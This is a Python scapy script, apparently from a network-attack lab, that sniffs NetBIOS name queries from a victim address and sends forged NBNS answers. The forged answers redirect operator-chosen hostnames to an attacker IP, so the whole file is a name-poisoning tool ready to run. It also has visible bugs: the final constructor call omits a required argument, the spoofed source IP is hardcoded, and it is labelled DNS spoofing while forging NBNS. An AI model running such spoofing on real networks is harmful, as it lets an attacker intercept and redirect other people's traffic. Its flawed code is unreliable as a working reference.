from pip._vendor.distlib.compat import raw_input
from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.netbios import NBNSQueryRequest, NBNSQueryResponse
import arpSpoof


class Dns():

    def __init__(self,networkInterface, victimIP, serverIP, spoofedWebsites):
        self.networkInterface = networkInterface
        self.victimIP = victimIP
        self.spoofedWebsites = spoofedWebsites
        self.serverIP = serverIP


    def startSniffing(self):
        sniff(prn=self.sendFakeResponse, iface=self.networkInterface, filter="port 137", timeout=20)


    def sendFakeResponse(self, pkt):
        nbnsqna = pkt[NBNSQueryRequest].QUESTION_NAME.decode('utf-8')
        nbnsqn = ""
        for i in range(0,len(nbnsqna)):
            if nbnsqna[i] == " ":
                nbnsqn += ""
            else:
                nbnsqn += nbnsqna[i]

        if pkt.haslayer(NBNSQueryRequest) and pkt[IP].src == self.victimIP:
            print(nbnsqn + " is being requested.")
            print(len(nbnsqn), [len(key) for key in self.spoofedWebsites.keys()])
            if  nbnsqn in self.spoofedWebsites.keys():
                print(nbnsqn + " is being redirected to " + self.spoofedWebsites.get(nbnsqn))
                etherLayer = Ether(src=get_if_hwaddr(self.networkInterface), dst=pkt[Ether].src)
                ipLayer = IP(src="192.168.56.56", dst=pkt[IP].src)
                udpLayer = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
                nbnsResponse = NBNSQueryResponse(NAME_TRN_ID=pkt[NBNSQueryRequest].NAME_TRN_ID,
                                                 RR_NAME=pkt[NBNSQueryRequest].QUESTION_NAME,
                                                 QDCOUNT=0, ANCOUNT=1, NSCOUNT=0, ARCOUNT=0, NB_ADDRESS=self.spoofedWebsites.get(nbnsqn))
                poisonedPaket = etherLayer / ipLayer / udpLayer / nbnsResponse

                sendp(poisonedPaket, verbose=0, iface=self.networkInterface)



    def start(self):
        while(True):
            self.startSniffing()

  
networkInterface = "enp0s3"
victimIP = "192.168.56.101"
#spoofedWebsites= {"WWW.GOOGLE.COM " : "192.168.56.102", "WWW.APPLE.COM  " : "192.168.56.102", "WWW.BLABLA.COM " : "192.168.56.102"} #when user will input it always add www. infront and make evrything in upper case
spoofedWebsites = {}


print ("Start DNS spoof")
redirectTo = raw_input("Enter the ip where or tool will redirect victim requests:")


input = ""
while input != "stop":
    input = raw_input("Enter the URL to DNS spoof list or stop if you are done: ")
    if input != "stop":
        input = input.upper()
        spoofedWebsites.update({input+"" : redirectTo})
        if input[0:4] != "WWW.":
            spoofedWebsites.update({"WWW."+ input+"": redirectTo})
        else:
            spoofedWebsites.update({input[4:]+"": redirectTo})

print(spoofedWebsites)
test = Dns(networkInterface, victimIP, spoofedWebsites)
test.start()
